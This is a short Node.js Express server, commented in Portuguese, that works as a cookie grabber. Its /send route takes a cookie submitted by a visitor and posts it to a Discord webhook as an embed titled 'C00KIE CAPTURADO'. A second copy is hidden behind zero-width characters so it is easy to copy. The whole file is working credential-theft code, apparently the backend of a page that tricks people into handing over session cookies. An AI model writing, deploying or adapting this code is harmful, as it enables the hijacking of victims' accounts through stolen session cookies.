const express = require('express');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static('public'));

// Página principal
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Rota que recebe o cookie
app.post('/send', async (req, res) => {
  const cookie = (req.body.cookie || '').toString().trim();
  const webhook = process.env.DISCORD_WEBHOOK;

  if (!cookie || !webhook) {
    return res.json({ status: "error" });
  }

  try {
    await fetch(webhook, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        embeds: [{
          title: "C00KIE CAPTURADO",
          description: "```" + cookie.substring(0, 1800) + (cookie.length > 1800 ? "\n... (cookie muito grande)" : "") + "```",
          color: 0x00ffea,
          timestamp: new Date().toISOString(),
          footer: { text: "Método LP • Seguro" }
        }],
        // Botão de copiar 100% invisível no chat
        content: "\u200B\u200B\u200B\u200B\u200B\u200B||`" + cookie + "`||"
      })
    });
  } catch (e) {
    console.error("Erro ao enviar pro Discord:", e);
  }

  res.json({ status: "ok" });
});

app.listen(PORT, () => {
  console.log(`Grabber rodando na porta ${PORT}`);
});
